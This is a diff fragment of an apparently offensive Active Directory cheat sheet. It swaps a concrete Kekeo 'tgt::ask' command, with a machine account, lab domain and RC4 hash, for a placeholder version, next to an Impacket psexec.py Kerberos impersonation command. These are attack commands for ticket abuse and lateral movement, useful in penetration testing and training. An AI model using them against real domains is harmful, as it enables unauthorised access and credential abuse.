@@ -353,7 +353,7 @@ psexec.py <domain>/<user-impersonate>@<FQDN-TargetMachine> -k -no-pass -target-i
 
 ask TGT:
 ```
-tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:5e77978a734e3a7f3895fb0fdbda3b96
+tgt::ask /user:<user-or-machine$> /domain:<domain> /rc4:<hash>
 ```
 ask tgs and force ldap service tgs:
 ```
